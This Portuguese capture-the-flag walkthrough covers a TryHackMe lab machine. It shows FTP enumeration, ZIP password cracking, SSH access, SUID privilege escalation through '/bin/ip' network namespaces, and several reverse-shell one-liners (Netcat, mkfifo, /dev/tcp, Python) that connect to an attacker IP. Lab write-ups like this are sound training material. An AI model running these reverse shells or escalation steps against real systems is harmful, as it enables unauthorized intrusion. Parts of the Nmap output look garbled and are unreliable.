
# ⚡ CTF Hogwarts — Writeup Completo (TryHackMe)

**Data:** 18 de Abril de 2026  
**Alvo:** `10.10.212.163`  
**Plataforma:** TryHackMe  
**Dificuldade:** Médio  
**Ferramentas:** Nmap, FTP, John the Ripper, Netcat, SSH  

> ⚠️ Este documento foi criado para fins educacionais em ambiente controlado (TryHackMe).

---

## 1. Reconhecimento de Rede (Nmap)

O objetivo inicial foi mapear a superfície de ataque e identificar serviços em portas não convencionais.

**Comando:**
```bash
nmap -sV -sC -Pn -T4 -p- 10.10.212.163
```

**Resultado:**
```
PORT      STATE SERVICE VERSION
22/tcp    open  http    Apache httpd 2.4.38 ((Debian))
9440/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
9736/tcp  open  http    PHP cli server 5.5 or later
|_http-title: Hogwart's Royal Entry
10255/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
43768/tcp open  unknown
| last sighted in hogwa
```

> 💡 **Raciocínio:** O scan revelou serviços críticos em portas altas. O FTP (10255) permitia login anônimo e a porta 9736 rodava um servidor PHP, indicando vetores de entrada via exfiltração e web.

---

## 2. Exploração de FTP e Exfiltração

Acesso ao FTP anônimo na porta **10255**, listagem de diretórios ocultos (`...`) e download dos arquivos encontrados.

**Sessão FTP:**
```bash
ftp 10.10.212.163 10255
# Login: anonymous / (sem senha)

ftp> ls -la
drwxr-xr-x    3 ftp  ftp  4096 Sep 06  2020 ..
drwxr-xr-x    2 ftp  ftp  4096 Apr 27 09:04 ...
-rw-r--r--    1 ftp  ftp   105 Sep 06  2020 GoAway.exe

ftp> get GoAway.exe
ftp> cd ...
ftp> ls -la
-rw-r--r--    1 ftp  ftp   231 Apr 27 09:04 .I_saved_it_harry.zip
-rw-r--r--    1 ftp  ftp   157 Sep 06  2020 note4neville

ftp> get note4neville
ftp> get .I_saved_it_harry.zip
ftp> exit
```

**Conteúdo dos arquivos:**
```
$ cat note4neville
Hagrid: Oi Neville even I ws able to open your secret file!
Yeah now change it before someone gets in.
These are troubled times, I tell ya 'roubled imes.!!

$ cat GoAway.exe
Hagrid: Oh no harry, y'are steell poking injections
around 'ere aren't ya? Go away 'arry, me tellin' ya.
```

> 💡 **Raciocínio:**
> - Diretório `...` indicou conteúdo escondido no FTP.
> - `GoAway.exe` → dica de **injections** → SQL Injection na web.
> - `note4neville` → Neville tinha um "secret file" (pista de credenciais).

---

## 3. Quebra de Senha do ZIP

O arquivo `.I_saved_it_harry.zip` estava protegido por senha.

**Crack com John the Ripper:**
```bash
zip2john .I_saved_it_harry.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Resultado:**
```
anime            (.I_saved_it_harry.zip/boot/.pass)
Session completed.
```

**Extração e credenciais:**
```bash
unzip .I_saved_it_harry.zip   # Senha: anime
cat boot/.pass
# neville:ocxxbwaznnkzkymq6m7tmdykv
```

> 💡 **Raciocínio:** Senha do ZIP = `anime`. O arquivo `boot/.pass` revelou credenciais `neville:ocxxbwaznnkzkymq6m7tmdykv` para acesso SSH.

---

## 4. Acesso SSH como Neville

```bash
ssh neville@10.10.212.163 -p 9440
# Senha: ocxxbwaznnkzkymq6m7tmdykv
```

```
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1112-aws x86_64)
neville@ip-10-10-212-163:~$
```

---

## 5. Enumeração de SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Destaques:**
```
/etc/room_of_requirement    ← binário custom
/bin/ip                     ← SUID explorável
/bin/su
/usr/bin/sudo
/usr/bin/pkexec
```

> 💡 **Raciocínio:** `/bin/ip` com SUID permite abusos com **network namespaces** para obter shell root. Também há o binário custom `/etc/room_of_requirement`.

---

## 6. Escalação de Privilégio via `/bin/ip`

```bash
neville@ip-10-10-212-163:~$ ip netns add foo
neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
# whoami
root
```

> ℹ️ **Técnica:** O binário `ip` com SUID permite criar *network namespaces* e executar comandos com privilégios elevados. O flag `-p` no `sh` preserva o effective UID (root).

---

## 7. Binário SUID Custom: `room_of_requirement`

```bash
ls -la /etc/room_of_requirement
# ---Sr-sr-x 1 root root 17126 Apr 27 09:04 /etc/room_of_requirement

strings /etc/room_of_requirement | grep -i cloak
# Invisibilty cloak: m5ktp!h970#ej0@8ja4hj8l00
```

---

## 8. Reverse Shell com Netcat

Após obter acesso SSH como **neville**, uma alternativa para obter shell interativa ou pivotar na rede é usar o **Netcat** para estabelecer uma reverse shell.

**Cenário:**
- **Atacante (sua máquina):** `10.10.153.170`
- **Alvo (CTF):** `10.10.212.163`
- **Porta escolhida:** `4444`

### Passo 1 — Listener na Máquina Atacante

```bash
nc -lvnp 4444
```

| Parâmetro | Descrição |
|-----------|-----------|
| `-l` | Modo *listen* (escuta) |
| `-v` | Modo verboso |
| `-n` | Sem resolução DNS |
| `-p 4444` | Porta de escuta |

### Passo 2 — Reverse Shell a partir do Alvo

**Opção A — Netcat tradicional (se `nc -e` estiver disponível):**
```bash
nc -e /bin/bash 10.10.153.170 4444
```

**Opção B — Netcat sem `-e` (mkfifo):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.153.170 4444 > /tmp/f
```

**Opção C — Bash puro (sem Netcat no alvo):**
```bash
bash -i >& /dev/tcp/10.10.153.170/4444 0>&1
```

**Opção D — Python (caso disponível):**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.153.170",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Passo 3 — Upgrade do Shell (TTY Interativo)

Após receber a conexão no listener:

```bash
# Spawnar TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Pressione Ctrl+Z, depois:
stty raw -echo; fg

# Ajustar ambiente:
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 120
```

### Passo 4 — Escalar para Root via Reverse Shell

```bash
ip netns add foo
ip netns exec foo /bin/sh -p
# whoami
root

cat /root/headmaster.txt
# THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
```

> 💡 **Raciocínio:** O Netcat permite obter um shell remoto interativo, útil quando o SSH é instável ou quando se precisa pivotar para outras máquinas na rede do laboratório. As opções B e C são úteis em ambientes onde o Netcat não possui a flag `-e`.

---

## 9. Flags Capturadas

| Personagem | Localização | Flag |
|------------|-------------|------|
| Hermione | `/home/hermoine/special_spell.txt` | `THM{its_wingardium_laviosaa_Ron}` |
| Harry | `/home/harry/special_spell.txt` | `THM{Yeah_1_swallowed_the_sn1tch.}` |
| Draco | `/home/draco/achievements.txt` | `THM{I_unarm3d_dumbled0re}` |
| Web Config | `/var/www/mymainsite/conn.php` | `THM{wait-for-your-letter!}` |
| Hidden Room | `/etc/left_corridor/seventh_floor/.entrance` | `THM{That-boy-was-Tom-Riddle}` |
| Root | `/root/headmaster.txt` | `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}` |

---

## 10. Resumo da Kill Chain

1. **Reconhecimento:** Nmap full port scan → 5 serviços identificados
2. **Enumeração FTP:** Login anônimo → diretório oculto `...` → ZIP protegido
3. **Crack:** John the Ripper quebrou a senha do ZIP (`anime`)
4. **Credenciais:** `boot/.pass` → `neville:ocxxbwaznnkzkymq6m7tmdykv`
5. **Acesso Inicial:** SSH na porta 9440 como `neville`
6. **Reverse Shell (Netcat):** Shell interativa via `nc` para maior controle
7. **Priv Esc:** `/bin/ip` SUID → `ip netns exec` → root
8. **Flags:** 6 flags capturadas em diversos locais do sistema

---

> 🛡️ *Este documento foi criado para fins educacionais. Ambiente controlado TryHackMe — uso autorizado.*
